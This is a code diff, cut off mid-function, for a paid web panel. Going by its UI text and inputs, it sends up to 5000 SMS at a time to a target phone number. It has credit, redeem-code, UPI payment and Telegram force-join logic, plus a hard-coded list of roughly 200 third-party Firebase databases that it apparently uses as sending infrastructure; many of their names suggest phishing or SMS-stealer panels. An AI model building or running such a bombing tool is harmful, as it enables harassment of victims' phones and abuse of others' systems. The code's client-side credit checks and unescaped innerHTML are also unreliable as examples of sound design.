+                    else { userCredits = 0; data[userId] = 0; localStorage.setItem(CREDIT_KEY, JSON.stringify(data)); }
+                } else {
+                    const data = {}; data[userId] = 0;
+                    localStorage.setItem(CREDIT_KEY, JSON.stringify(data));
+                }
+                const sys = localStorage.getItem(SYSTEM_KEY);
+                if (sys !== null) isSystemOn = JSON.parse(sys);
+                const verified = localStorage.getItem(VERIFIED_KEY + '_' + userId);
+                isVerified = verified === 'true';
+                const freeGiven = localStorage.getItem(FREE_CREDITS_KEY + '_' + userId);
+                freeCreditsGiven = freeGiven === 'true';
+            } catch(e) {}
+        }
+
+        function saveCredits() {
+            try {
+                const data = JSON.parse(localStorage.getItem(CREDIT_KEY) || '{}');
+                data[getUserId()] = userCredits;
+                localStorage.setItem(CREDIT_KEY, JSON.stringify(data));
+            } catch(e) {}
+        }
+
+        function getDailyLimit() {
+            try {
+                const raw = localStorage.getItem(DAILY_LIMIT_KEY + '_' + getUserId());
+                if (!raw) return { date: '', used: 0 };
+                const parsed = JSON.parse(raw);
+                return { date: parsed.date || '', used: parsed.used || 0 };
+            } catch(e) { return { date: '', used: 0 }; }
+        }
+
+        function saveDailyLimit(limit) {
+            localStorage.setItem(DAILY_LIMIT_KEY + '_' + getUserId(), JSON.stringify(limit));
+        }
+
+        function getAllUsersData() { try { return JSON.parse(localStorage.getItem(CREDIT_KEY) || '{}'); } catch(e) { return {}; } }
+        function getAllVerifiedUsers() {
+            const v = {};
+            try { for (const k of Object.keys(localStorage)) { if (k.startsWith(VERIFIED_KEY + '_')) { const id = k.replace(VERIFIED_KEY + '_', ''); if (localStorage.getItem(k) === 'true') v[id] = true; } } } catch(e) {}
+            return v;
+        }
+        function getAllPayments() { try { return JSON.parse(localStorage.getItem(PAYMENTS_KEY) || '[]'); } catch(e) { return []; } }
+        function savePayments(p) { localStorage.setItem(PAYMENTS_KEY, JSON.stringify(p)); }
+
+        function getAllRedeemCodes() {
+            try { return JSON.parse(localStorage.getItem(REDEEM_CODES_KEY) || '[]'); }
+            catch(e) { return []; }
+        }
+        function saveRedeemCodes(c) { localStorage.setItem(REDEEM_CODES_KEY, JSON.stringify(c)); }
+
+        function updateCreditDisplay() {
+            document.getElementById('creditCount').textContent = userCredits;
+            document.getElementById('systemStatusLabel').textContent = isSystemOn ? 'ON' : 'OFF';
+            document.getElementById('systemOnOff').checked = isSystemOn;
+            document.getElementById('currentUserIdDisplay').textContent = getUserId().substring(0, 20) + '...';
+
+            const today = new Date().toISOString().slice(0, 10);
+            const dl = getDailyLimit();
+            const usedToday = dl.date === today ? dl.used : 0;
+            const remainingToday = DAILY_CREDIT_LIMIT - usedToday;
+            const creditStatusEl = document.getElementById('creditStatus');
+            if (isAdmin) {
+                creditStatusEl.innerHTML = '👑 Admin — unlimited';
+            } else {
+                creditStatusEl.innerHTML = `⚡ 1 Credit = 5000 SMS<br>Aaj ke free: ${remainingToday}/${DAILY_CREDIT_LIMIT}`;
+            }
+
+            const data = getAllUsersData();
+            const verifiedUsers = getAllVerifiedUsers();
+            const userCount = Object.keys(data).length;
+            document.getElementById('userCount').textContent = userCount;
+            document.getElementById('totalCredits').textContent = Object.values(data).reduce((a,b) => a+b, 0);
+            const list = document.getElementById('userList');
+            if (userCount === 0) { list.innerHTML = '<div style="color:#333;font-size:10px;padding:8px;">No users yet</div>'; return; }
+            let html = '';
+            for (const [id, credits] of Object.entries(data)) {
+                const isV = verifiedUsers[id] || false;
+                const statusClass = isV ? 'verified' : 'unverified';
+                const statusLabel = isV ? '✅' : '❌';
+                html += `<div class="user-item">
+                    <div style="flex:1;min-width:160px;">
+                        <div class="user-id">${id}</div>
+                        <div style="margin-top:3px;"><span class="user-credits">${credits} 💎</span> <span class="user-status ${statusClass}">${statusLabel}</span></div>
+                    </div>
+                    <div style="display:flex;gap:4px;">
+                        <button class="ubtn add" onclick="quickAdd('${id}',1)">+1</button>
+                        <button class="ubtn add" onclick="quickAdd('${id}',10)">+10</button>
+                        <button class="ubtn rem" onclick="quickRem('${id}',1)">-1</button>
+                        <button class="ubtn bc" onclick="broadcastTo('${id}')">📢</button>
+                    </div>
+                </div>`;
+            }
+            list.innerHTML = html;
+            renderGeneratedCodes();
+        }
+
+        function quickAdd(uid, amt) { adminAddCredits(uid, amt); }
+        function quickRem(uid, amt) { adminRemoveCredits(uid, amt); }
+
+        function broadcastTo(uid) {
+            const msg = prompt("📢 Message to send to user " + uid.substring(0, 16) + "...");
+            if (!msg || !msg.trim()) return;
+            const broadcasts = JSON.parse(localStorage.getItem(BROADCAST_KEY) || '{}');
+            if (!broadcasts[uid]) broadcasts[uid] = [];
+            broadcasts[uid].push({ message: msg, timestamp: Date.now(), from: ADMIN_USERNAME });
+            localStorage.setItem(BROADCAST_KEY, JSON.stringify(broadcasts));
+            log(`📢 Broadcast sent to ${uid.substring(0,14)}...`, 'ok');
+            alert('✅ Broadcast queued for user!');
+        }
+
+        function giveFreeCredits() {
+            const userId = getUserId();
+            if (freeCreditsGiven) return false;
+            userCredits += FREE_CREDITS;
+            freeCreditsGiven = true;
+            localStorage.setItem(FREE_CREDITS_KEY + '_' + userId, 'true');
+            saveCredits();
+            updateCreditDisplay();
+            log(`🎁 ${FREE_CREDITS} FREE credits added!`, 'ok');
+            return true;
+        }
+
+        function adminAddCredits(userId, amount) {
+            const data = getAllUsersData();
+            if (data[userId] !== undefined) data[userId] += amount; else data[userId] = amount;
+            localStorage.setItem(CREDIT_KEY, JSON.stringify(data));
+            if (userId === getUserId()) userCredits = data[userId];
+            updateCreditDisplay();
+            log(`💎 Added ${amount} credits to ${userId.substring(0,14)}...`, 'ok');
+        }
+
+        function adminRemoveCredits(userId, amount) {
+            const data = getAllUsersData();
+            if (data[userId] !== undefined) data[userId] = Math.max(0, data[userId] - amount);
+            else data[userId] = 0;
+            localStorage.setItem(CREDIT_KEY, JSON.stringify(data));
+            if (userId === getUserId()) userCredits = data[userId];
+            updateCreditDisplay();
+            log(`💎 Removed ${amount} credits from ${userId.substring(0,14)}...`, 'warn');
+        }
+
+        function toggleSystem() {
+            isSystemOn = !isSystemOn;
+            localStorage.setItem(SYSTEM_KEY, JSON.stringify(isSystemOn));
+            updateCreditDisplay();
+            log(`⚡ System ${isSystemOn ? 'ON' : 'OFF'}`, 'info');
+        }
+
+        document.getElementById('systemOnOff').addEventListener('change', toggleSystem);
+
+        document.getElementById('adminAddCreditsBtn').addEventListener('click', () => {
+            const uid = document.getElementById('targetUserId').value.trim() || getUserId();
+            const amt = parseInt(document.getElementById('adminCreditAmount').value) || 1;
+            if (amt > 0) adminAddCredits(uid, amt);
+        });
+        document.getElementById('adminRemoveCreditsBtn').addEventListener('click', () => {
+            const uid = document.getElementById('targetUserId').value.trim() || getUserId();
+            const amt = parseInt(document.getElementById('adminCreditAmount').value) || 1;
+            if (amt > 0) adminRemoveCredits(uid, amt);
+        });
+
+        function generateDragonCode() {
+            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+            let rand = '';
+            for (let i = 0; i < 8; i++) rand += chars[Math.floor(Math.random() * chars.length)];
+            return 'Dragon' + rand;
+        }
+
+        function generateRedeemCode() {
+            const credits = parseInt(document.getElementById('redeemCreditsInput').value) || 10;
+            if (credits <= 0 || credits > 9999) { alert('⚠️ Credits 1-9999 ke beech rakho'); return; }
+            const codes = getAllRedeemCodes();
+            let newCode;
+            do { newCode = generateDragonCode(); } while (codes.some(c => c.code === newCode));
+            codes.push({
+                code: newCode, credits: credits, createdBy: ADMIN_USERNAME,
+                createdAt: Date.now(), usedBy: null, usedAt: null
+            });
+            saveRedeemCodes(codes);
+            log(`🎟️ Code generated: ${newCode} (${credits} credits)`, 'ok');
+            renderGeneratedCodes();
+            try { navigator.clipboard.writeText(newCode); log(`📋 Copied to clipboard!`, 'info'); } catch(e) {}
+            alert(`✅ Code Generated!\n\nCode: ${newCode}\nCredits: ${credits}\n\n(Auto-copied to clipboard)`);
+        }
+
+        function renderGeneratedCodes() {
+            const codes = getAllRedeemCodes().slice().reverse();
+            const list = document.getElementById('generatedCodesList');
+            if (!list) return;
+            if (codes.length === 0) {
+                list.innerHTML = '<div style="color:#333;font-size:10px;padding:4px 0;">No codes generated yet</div>';
+                return;
+            }
+            let html = '';
+            codes.slice(0, 30).forEach(c => {
+                const used = c.usedBy ? '❌ Used' : '✅ Available';
+                const color = c.usedBy ? '#666' : '#4ade80';
+                const safeCode = c.code.replace(/'/g, "\\'");
+                html += `<div style="display:flex;justify-content:space-between;align-items:center;gap:8px;padding:6px 8px;border-bottom:1px solid #0d0d0d;font-size:11px;">
+                    <div style="flex:1;min-width:120px;">
+                        <div style="color:#facc15;font-family:monospace;font-weight:700;">${c.code}</div>
+                        <div style="color:#666;font-size:9px;">${c.credits} credits · <span style="color:${color};">${used}</span></div>
+                    </div>
+                    <button class="ubtn bc" style="padding:3px 8px;" onclick="copyCode('${safeCode}')">📋</button>
+                </div>`;
+            });
+            list.innerHTML = html;
+        }
+
+        function copyCode(code) {
+            try { navigator.clipboard.writeText(code); log(`📋 Copied: ${code}`, 'info'); alert('✅ Code copied!'); }
+            catch(e) { prompt('📋 Copy this code:', code); }
+        }
+
+        function showRedeemModal() {
+            document.getElementById('redeemModal').classList.add('visible');
+            document.getElementById('redeemCodeInput').value = '';
+            document.getElementById('redeemErr').textContent = '';
+            document.getElementById('redeemErr').style.color = '#ef4444';
+            setTimeout(() => document.getElementById('redeemCodeInput').focus(), 200);
+        }
+        function hideRedeemModal() { document.getElementById('redeemModal').classList.remove('visible'); }
+
+        function redeemCode() {
+            const input = document.getElementById('redeemCodeInput').value.trim();
+            const err = document.getElementById('redeemErr');
+            if (!input) { err.textContent = '❌ Enter a code'; return; }
+            const codes = getAllRedeemCodes();
+            const found = codes.find(c => c.code.toLowerCase() === input.toLowerCase());
+            if (!found) { err.textContent = '❌ Invalid code'; return; }
+            if (found.usedBy) { err.textContent = '❌ Code already used'; return; }
+            found.usedBy = getUserId();
+            found.usedAt = Date.now();
+            saveRedeemCodes(codes);
+            userCredits += found.credits;
+            saveCredits();
+            updateCreditDisplay();
+            log(`🎟️ Redeem success! +${found.credits} credits added.`, 'ok');
+            err.style.color = '#4ade80';
+            err.textContent = `✅ Success! +${found.credits} credits added!`;
+            setTimeout(() => { hideRedeemModal(); err.style.color = '#ef4444'; }, 1500);
+        }
+
+        document.getElementById('genRedeemCodeBtn').addEventListener('click', generateRedeemCode);
+        document.getElementById('redeemSubmitBtn').addEventListener('click', redeemCode);
+        document.getElementById('redeemCodeInput').addEventListener('keypress', e => { if (e.key === 'Enter') redeemCode(); });
+
+        function verifyUser() {
+            const overlay = document.getElementById('forceJoinOverlay');
+            const statusMsg = document.getElementById('joinStatusMsg');
+            const visited = sessionStorage.getItem('tg_visited_' + CHANNEL_USERNAME);
+            if (visited === 'true') {
+                isVerified = true;
+                localStorage.setItem(VERIFIED_KEY + '_' + getUserId(), 'true');
+                giveFreeCredits();
+                overlay.classList.add('hidden');
+                statusMsg.textContent = '✅ Verified!';
+                statusMsg.className = 'status-msg success';
+                updateCreditDisplay();
+            } else {
+                statusMsg.textContent = '⚠️ Click "Join Channel" first.';
+                statusMsg.className = 'status-msg error';
+                window.open(CHANNEL_URL, '_blank');
+            }
+        }
+
+        document.querySelector('.tg-btn').addEventListener('click', () => {
+            sessionStorage.setItem('tg_visited_' + CHANNEL_USERNAME, 'true');
+        });
+        document.getElementById('verifyJoinBtn').addEventListener('click', verifyUser);
+
+        function getUpiLink(amount) { return `upi://pay?pa=${UPI_ID}&pn=${encodeURIComponent(UPI_NAME)}&am=${amount}&cu=INR`; }
+
+        function renderQr(amount) {
+            const qrBox = document.getElementById('qrBox');
+            const link = getUpiLink(amount);
+            qrBox.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(link)}" style="width:180px;height:180px;">`;
+        }
+
+        document.querySelectorAll('.pkg').forEach(pkg => {
+            pkg.addEventListener('click', () => {
+                document.querySelectorAll('.pkg').forEach(p => p.classList.remove('selected'));
+                pkg.classList.add('selected');
+                selectedPackage = { credits: parseInt(pkg.dataset.credits), price: parseInt(pkg.dataset.price) };
+                document.getElementById('amountInfo').textContent = `Pay ₹${selectedPackage.price} for ${selectedPackage.credits} credits`;
+                renderQr(selectedPackage.price);
+            });
+        });
+
+        document.getElementById('scanQrBtn').addEventListener('click', () => {
+            if (!selectedPackage) { log('⚠️ Select package first', 'err'); return; }
+            openScanner();
+        });
+
+        let html5QrCode = null;
+        function openScanner() {
+            document.getElementById('scannerModal').classList.add('visible');
+            if (!html5QrCode) html5QrCode = new Html5Qrcode("qrReader");
+            html5QrCode.start({ facingMode: "environment" }, { fps: 10, qrbox: 250 },
+                (decodedText) => { try { window.location.href = decodedText; } catch(e) {} closeScanner(); },
+                () => {}
+            ).catch(e => log('❌ Camera: ' + e.message, 'err'));
+        }
+        function closeScanner() {
+            if (html5QrCode) { html5QrCode.stop().then(() => html5QrCode.clear()).catch(() => {}); }
+            document.getElementById('scannerModal').classList.remove('visible');
+        }
+        document.getElementById('scannerCloseBtn').addEventListener('click', closeScanner);
+
+        document.getElementById('submitPaymentBtn').addEventListener('click', () => {
+            if (!selectedPackage) { log('⚠️ Select package', 'err'); return; }
+            const txn = document.getElementById('txnIdInput').value.trim();
+            if (!txn || txn.length < 6) { log('⚠️ Enter valid UTR', 'err'); return; }
+            const payments = getAllPayments();
+            payments.push({
+                id: 'pay_' + Date.now() + '_' + Math.random().toString(36).substr(2, 4),
+                userId: getUserId(), credits: selectedPackage.credits, price: selectedPackage.price,
+                txnId: txn, status: 'pending', timestamp: Date.now()
+            });
+            savePayments(payments);
+            log(`📤 Payment submitted! ₹${selectedPackage.price} for ${selectedPackage.credits} credits — waiting for admin.`, 'ok');
+            document.getElementById('txnIdInput').value = '';
+            document.querySelectorAll('.pkg').forEach(p => p.classList.remove('selected'));
+            selectedPackage = null;
+            document.getElementById('amountInfo').textContent = 'Select a package above';
+            if (isAdmin) loadPendingPayments();
+        });
+
+        function loadPendingPayments() {
+            const payments = getAllPayments().filter(p => p.status === 'pending');
+            const list = document.getElementById('pendingPaymentsList');
+            document.getElementById('pendingCount').textContent = `(${payments.length})`;
+            if (payments.length === 0) { list.innerHTML = '<div class="pending-empty">No pending payments</div>'; return; }
+            let html = '';
+            payments.forEach(p => {
+                const time = new Date(p.timestamp).toLocaleString('en-IN');
+                html += `<div class="pending-item">
+                    <div class="pi-info">
+                        👤 <strong>${p.userId.substring(0, 22)}...</strong><br>
+                        💎 <strong>${p.credits} credits</strong> · 💵 ₹${p.price}<br>
+                        🔢 UTR: <code>${p.txnId}</code><br>
+                        🕐 ${time}
+                    </div>
+                    <div class="pi-actions">
+                        <button class="approve" onclick="approvePayment('${p.id}')">✅ Approve</button>
+                        <button class="reject" onclick="rejectPayment('${p.id}')">❌ Reject</button>
+                    </div>
+                </div>`;
+            });
+            list.innerHTML = html;
+        }
+
+        function approvePayment(paymentId) {
+            const payments = getAllPayments();
+            const p = payments.find(x => x.id === paymentId);
+            if (!p || p.status !== 'pending') return;
+            p.status = 'approved';
+            savePayments(payments);
+            adminAddCredits(p.userId, p.credits);
+            log(`✅ Payment approved · ${p.credits} credits to ${p.userId.substring(0,14)}`, 'ok');
+            loadPendingPayments();
+        }
+
+        function rejectPayment(paymentId) {
+            const payments = getAllPayments();
+            const p = payments.find(x => x.id === paymentId);
+            if (!p || p.status !== 'pending') return;
+            p.status = 'rejected';
+            savePayments(payments);
+            log(`❌ Payment rejected`, 'warn');
+            loadPendingPayments();
+        }
+
+        const MESSAGE_LIMIT = 500;
+        const FETCH_TIMEOUT_MS = 5000;
+        const MAX_SMS_PER_USE = 5000;
+
+        const RAW_URLS = [
+    "https://vasu-panel-default-rtdb.firebaseio.com","https://retameta-default-rtdb.firebaseio.com",
+    "https://krishna4343-e45fd-default-rtdb.firebaseio.com","https://kdbhai-25325-default-rtdb.firebaseio.com",
+    "https://land-le-mera-default-rtdb.firebaseio.com","https://kichudjdudh-default-rtdb.firebaseio.com",
+    "https://mithun-da-default-rtdb.firebaseio.com","https://ajay-5cac9-default-rtdb.firebaseio.com",
+    "https://back-b40b7-default-rtdb.asia-southeast1.firebasedatabase.app","https://pmnew230-default-rtdb.firebaseio.com",
+    "https://rahul-panel-default-rtdb.firebaseio.com","https://birend-b39e9-default-rtdb.firebaseio.com",
+    "https://baba15-default-rtdb.asia-southeast1.firebasedatabase.app","https://mamu-4db6e-default-rtdb.firebaseio.com",
+    "https://bihar-master-panel-fb7cd-default-rtdb.firebaseio.com","https://bhai-138a8-default-rtdb.firebaseio.com",
+    "https://raj-bhai-1c1ad-default-rtdb.firebaseio.com","https://ranimukarji-1182a-default-rtdb.firebaseio.com",
+    "https://biharibhaiya-c718b-default-rtdb.firebaseio.com","https://shukla2-default-rtdb.firebaseio.com",
+    "https://ranjit-58640-default-rtdb.firebaseio.com","https://newpanel-4412c-default-rtdb.firebaseio.com",
+    "https://bittu3pannel-default-rtdb.firebaseio.com","https://lalan-c7e44-default-rtdb.firebaseio.com",
+    "https://uffuuf-d1a3c-default-rtdb.firebaseio.com","https://fir-new-3-b572a-default-rtdb.firebaseio.com",
+    "https://lol40-5bab7-default-rtdb.firebaseio.com","https://rajaji-8d135-default-rtdb.firebaseio.com",
+    "https://panelwalababa-ddd53-default-rtdb.firebaseio.com","https://vikash-da-default-rtdb.firebaseio.com",
+    "https://rea72-1566e-default-rtdb.firebaseio.com","https://hospital-new-11-default-rtdb.firebaseio.com",
+    "https://nowammyxdd-default-rtdb.firebaseio.com","https://jujuboorchodi-default-rtdb.firebaseio.com",
+    "https://seuihd-default-rtdb.firebaseio.com","https://suman0h55-default-rtdb.firebaseio.com",
+    "https://whithex-741e0-default-rtdb.firebaseio.com","https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
+    "https://expert-5e1a0-default-rtdb.firebaseio.com","https://jakepau-default-rtdb.firebaseio.com",
+    "https://raj-londa-49db5-default-rtdb.firebaseio.com","https://pm280reolc-default-rtdb.firebaseio.com",
+    "https://botsieeee-af07c-default-rtdb.firebaseio.com","https://topx-e09c6-default-rtdb.firebaseio.com",
+    "https://lallo-6d4c5-default-rtdb.firebaseio.com","https://second-wife-2-default-rtdb.firebaseio.com",
+    "https://nand-d09e7-default-rtdb.firebaseio.com","https://krishna5454-94fc5-default-rtdb.firebaseio.com",
+    "https://asda-271a6-default-rtdb.firebaseio.com","https://trigonnnnnnnn-default-rtdb.firebaseio.com",
+    "https://xxxdrafft-default-rtdb.asia-southeast1.firebasedatabase.app","https://arun-4024e-default-rtdb.firebaseio.com",
+    "https://landlele-20855-default-rtdb.firebaseio.com","https://arjun-singh-43d2f-default-rtdb.firebaseio.com",
+    "https://dark-ka-app-default-rtdb.firebaseio.com","https://nidhi-rani-default-rtdb.firebaseio.com",
+    "https://nitu-23980-default-rtdb.firebaseio.com","https://krijhjuiiiccyy-default-rtdb.firebaseio.com",
+    "https://rahul-g11-default-rtdb.firebaseio.com","https://rto-56-6cccf-default-rtdb.firebaseio.com",
+    "https://download-b7393-default-rtdb.firebaseio.com","https://rohet10-8919f-default-rtdb.firebaseio.com",
+    "https://lol11-7da1c-default-rtdb.firebaseio.com","https://ankitpanel-59086-default-rtdb.firebaseio.com",
+    "https://rason00-default-rtdb.firebaseio.com","https://ne-2db23-default-rtdb.asia-southeast1.firebasedatabase.app",
+    "https://itslooksexp-default-rtdb.firebaseio.com","https://raj-madarchodo-default-rtdb.firebaseio.com",
+    "https://admin-sonu-8a567-default-rtdb.firebaseio.com","https://randipelega-default-rtdb.firebaseio.com",
+    "https://e21turnament2-default-rtdb.firebaseio.com","https://ambani-19a25-default-rtdb.firebaseio.com",
+    "https://sonuganduu-9d4da-default-rtdb.firebaseio.com","https://gadhalalund-default-rtdb.firebaseio.com",
+    "https://ahmedpanel-76b9c-default-rtdb.firebaseio.com","https://khanipanel-d58cf-default-rtdb.firebaseio.com",
+    "https://jyotiya75-default-rtdb.firebaseio.com","https://saanvi-ji95-default-rtdb.firebaseio.com",
+    "https://rto8-7f24f-default-rtdb.firebaseio.com","https://penal-a93a8-default-rtdb.firebaseio.com",
+    "https://ubhanhazx-default-rtdb.firebaseio.com","https://pikachu-customer-16-default-rtdb.firebaseio.com",
+    "https://e8383jsndn-default-rtdb.firebaseio.com","https://saimharshji-default-rtdb.asia-southeast1.firebasedatabase.app",
+    "https://mypnl01-ush-default-rtdb.firebaseio.com","https://proof-abf73-default-rtdb.firebaseio.com",
+    "https://apna3-e04f8-default-rtdb.firebaseio.com","https://bola-2a0d3-default-rtdb.firebaseio.com",
+    "https://lol24-95c49-default-rtdb.firebaseio.com","https://fatmaadminpanel-default-rtdb.firebaseio.com",
+    "https://rahulsharma-13303-default-rtdb.firebaseio.com","https://myypppp-default-rtdb.asia-southeast1.firebasedatabase.app",
+    "https://shsh-fb9c8-default-rtdb.firebaseio.com","https://raj-panel-3e09a-default-rtdb.firebaseio.com",
+    "https://khanpanel-c31a2-default-rtdb.firebaseio.com","https://pornllllll-default-rtdb.firebaseio.com",
+    "https://riyy-e012e-default-rtdb.firebaseio.com","https://rajanmadarchod-fa98d-default-rtdb.firebaseio.com",
+    "https://workohplic-default-rtdb.firebaseio.com","https://panel-no-21-default-rtdb.firebaseio.com",
+    "https://comkingdir-default-rtdb.firebaseio.com","https://badka-3181b-default-rtdb.firebaseio.com",
+    "https://kalui-a8e2b-default-rtdb.firebaseio.com","https://vickyadmin45-default-rtdb.firebaseio.com",
+    "https://iqrapanel-2f21d-default-rtdb.firebaseio.com","https://rahul-8b7eb-default-rtdb.firebaseio.com",
+    "https://bali-7acc3-default-rtdb.firebaseio.com","https://firstlove2-1f2d9-default-rtdb.firebaseio.com",
+    "https://sourav-f057d-default-rtdb.firebaseio.com","https://pappuraj-714bd-default-rtdb.firebaseio.com",
+    "https://astha-rani80-default-rtdb.firebaseio.com","https://rohitbona-d8308-default-rtdb.firebaseio.com",
+    "https://adityakaapp-default-rtdb.firebaseio.com","https://hghg-6f0a8-default-rtdb.asia-southeast1.firebasedatabase.app",
+    "https://tabuna-4e962-default-rtdb.firebaseio.com","https://biki-3ae6e-default-rtdb.firebaseio.com",
+    "https://adamm-green-default-rtdb.firebaseio.com","https://gdgdgdgd-c1a32-default-rtdb.firebaseio.com",
+    "https://nitish232626-default-rtdb.firebaseio.com","https://amaat-a7916-default-rtdb.firebaseio.com",
+    "https://project-1-16da0-default-rtdb.firebaseio.com","https://aditya-9f66b-default-rtdb.firebaseio.com",
+    "https://aya-tandi-default-rtdb.firebaseio.com","https://ahmedpanel-e3d2d-default-rtdb.firebaseio.com",
+    "https://mera-lala-default-rtdb.firebaseio.com","https://iqrapanel-37c8d-default-rtdb.firebaseio.com",
+    "https://baba-tillu-2-default-rtdb.firebaseio.com","https://tuuui-60b15-default-rtdb.firebaseio.com",
+    "https://fir-d327e-default-rtdb.firebaseio.com","https://iiilsoee-default-rtdb.firebaseio.com",
+    "https://vikasda-a78d5-default-rtdb.firebaseio.com","https://polti-1317f-default-rtdb.firebaseio.com",
+    "https://rahulbhi-default-rtdb.firebaseio.com","https://arrun01-b1ece-default-rtdb.firebaseio.com",
+    "https://rto-sandeep3-default-rtdb.firebaseio.com","https://xrafaf-bfe94-default-rtdb.firebaseio.com",
+    "https://vijay-afb12-default-rtdb.firebaseio.com","https://rontem-a082b-default-rtdb.firebaseio.com",
+    "https://adultapk-c3c4f-default-rtdb.firebaseio.com","https://harrwp-6be36-default-rtdb.firebaseio.com",
+    "https://pmnew157-default-rtdb.firebaseio.com","https://madam-ji-17e1c-default-rtdb.firebaseio.com",
+    "https://ramu-c81a7-default-rtdb.firebaseio.com","https://pm-kisan-22f92-default-rtdb.firebaseio.com",
+    "https://mainapanel-cleint-default-rtdb.firebaseio.com","https://allinone-cf029-default-rtdb.firebaseio.com",
+    "https://ramjidost-default-rtdb.firebaseio.com","https://demon-4-default-rtdb.firebaseio.com",
+    "https://hkfs-38ed5-default-rtdb.firebaseio.com","https://ashishraj2-7e2e2-default-rtdb.firebaseio.com",
+    "https://ak-boss-3a292-default-rtdb.firebaseio.com","https://yellowpanel-9f036-default-rtdb.firebaseio.com",
+    "https://tanvi-ji77-default-rtdb.firebaseio.com","https://raj-admin-nokia-default-rtdb.firebaseio.com",
+    "https://maxjoker98-2b75f-default-rtdb.firebaseio.com","https://sagarguddu-268cb-default-rtdb.firebaseio.com",
+    "https://akdk-f23fa-default-rtdb.firebaseio.com","https://tracegod-168d5-default-rtdb.firebaseio.com",
+    "https://uday-gaw-default-rtdb.firebaseio.com","https://abhirt-58f65-default-rtdb.firebaseio.com",
+    "https://krish-gana-default-rtdb.firebaseio.com","https://e10ttqaq-default-rtdb.firebaseio.com",
+    "https://oooo-2f098-default-rtdb.firebaseio.com","https://subhash-45fb2-default-rtdb.firebaseio.com",
+    "https://commotazee-darkness-default-rtdb.firebaseio.com","https://kanak-ji99-default-rtdb.firebaseio.com",
+    "https://saiyaraaa-ee8c4-default-rtdb.firebaseio.com","https://priyaknn-3e914-default-rtdb.firebaseio.com",
+    "https://urmila-ji12-default-rtdb.firebaseio.com","https://amulyaji8080-default-rtdb.firebaseio.com",
+    "https://lucky-c0915-default-rtdb.firebaseio.com","https://priya-cfdb7-default-rtdb.firebaseio.com",
+    "https://alwayssukuna-4dbb7-default-rtdb.firebaseio.com","https://jrahh-83b83-default-rtdb.firebaseio.com",
+    "https://videocalls-f3434-default-rtdb.firebaseio.com","https://mama-ji-09-default-rtdb.firebaseio.com",
+    "https://dark-1b5d9-default-rtdb.firebaseio.com","https://sakshi1-dfc80-default-rtdb.firebaseio.com",
+    "https://gojohere-29ab1-default-rtdb.firebaseio.com","https://zamzam-baba77-default-rtdb.firebaseio.com",
+    "https://ankit-raj-chutiya-default-rtdb.firebaseio.com","https://akdh-e4bf4-default-rtdb.firebaseio.com",
+    "https://arda-2fc05-default-rtdb.firebaseio.com","https://amit-6f40a-default-rtdb.firebaseio.com",
+    "https://usa-n-landon-default-rtdb.firebaseio.com","https://hjmi-5af19-default-rtdb.firebaseio.com",
+    "https://chumma-70293-default-rtdb.firebaseio.com","https://hdfc-chodo-default-rtdb.firebaseio.com",
+    "https://ravindra-d7887-default-rtdb.firebaseio.com","https://ak47-e3976-default-rtdb.firebaseio.com",
+    "https://mkdg-6a8f6-default-rtdb.firebaseio.com","https://arunku25-9479d-default-rtdb.firebaseio.com",
+    "https://ajio-427d1-default-rtdb.firebaseio.com","https://htbc51-default-rtdb.firebaseio.com",
+    "https://rurukatiu-default-rtdb.firebaseio.com","https://new-panel-1e4a9-default-rtdb.firebaseio.com",
+    "https://vasu-3rd-panel-default-rtdb.firebaseio.com","https://rrt1-c797a-default-rtdb.firebaseio.com",
+    "https://akumar-12eb3-default-rtdb.firebaseio.com","https://riya-f1832-default-rtdb.firebaseio.com",
+    "https://ghostx-panel-default-rtdb.firebaseio.com","https://rajendra-2934a-default-rtdb.firebaseio.com",
+    "https://e-challan-54-default-rtdb.firebaseio.com","https://vrajbhai-4aa6e-default-rtdb.firebaseio.com",
+    "https://hacker-panel-dcc53-default-rtdb.firebaseio.com","https://atifhehu-7ec17-default-rtdb.firebaseio.com",
+    "https://private-522a9-default-rtdb.firebaseio.com","https://bittu-panal-cleint-default-rtdb.firebaseio.com",
+    "https://soni-bbb64-default-rtdb.firebaseio.com","https://zxcvbnm-13fb3-default-rtdb.firebaseio.com",
+    "https://rahu-96df7-default-rtdb.firebaseio.com","https://courier40-30jan-default-rtdb.firebaseio.com",
+    "https://fixhogya-5b6e3-default-rtdb.firebaseio.com","https://bega-8457c-default-rtdb.firebaseio.com",
+    "https://mr-dr-72761-default-rtdb.firebaseio.com","https://sintuadmin-default-rtdb.firebaseio.com",
+    "https://vijayda-default-rtdb.firebaseio.com","https://rto-47-b39f4-default-rtdb.firebaseio.com",
+    "https://maja-1c323-default-rtdb.firebaseio.com","https://benga-7d896-default-rtdb.firebaseio.com",
+    "https://bipin-57f82-default-rtdb.firebaseio.com","https://sumankr5764-e0ba8-default-rtdb.firebaseio.com",
+    "https://kattapa-7faf3-default-rtdb.firebaseio.com","https://rahudf-default-rtdb.firebaseio.com",
+    "https://udyydfuuhc-default-rtdb.firebaseio.com"
+];
+
+        const DATABASE_URLS = [...new Set(RAW_URLS)];
+
+        const targetInput = document.getElementById('targetNumber');
+        const messageInput = document.getElementById('messageText');
+        const secretInput = document.getElementById('secretKey');
+        const quantitySelect = document.getElementById('quantitySelect');
+        const speedSelect = document.getElementById('speedSelect');
+        const sendBtn = document.getElementById('sendBtn');
+        const logEl = document.getElementById('log');
+        const statusBar = document.getElementById('statusBar');
+        const onlineCount = document.getElementById('onlineCount');
+        const sentCount = document.getElementById('sentCount');
+        const failCount = document.getElementById('failCount');
+        const roundCount = document.getElementById('roundCount');
+        const progressText = document.getElementById('progressText');
+        const dbCountBadge = document.getElementById('dbCountBadge');
+        dbCountBadge.textContent = `📡 ${DATABASE_URLS.length} DBs`;
+
+        function log(msg, type = '') {
+            const time = new Date().toLocaleTimeString('en-IN', { hour12: false });
+            const div = document.createElement('div');
+            div.className = 'entry';
+            div.innerHTML = `<span class="time">${time}</span><span class="msg ${type}">${msg}</span>`;
+            logEl.appendChild(div);
+            logEl.scrollTop = logEl.scrollHeight;
+        }
+
+        function genRandomKey() {
+            const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+            let s = '';
+            for (let i = 0; i < 8; i++) s += chars[Math.floor(Math.random() * chars.length)];
+            return s;
+        }
+
+        function fetchWithTimeout(url, options = {}, timeoutMs = FETCH_TIMEOUT_MS) {
+            const controller = new AbortController();
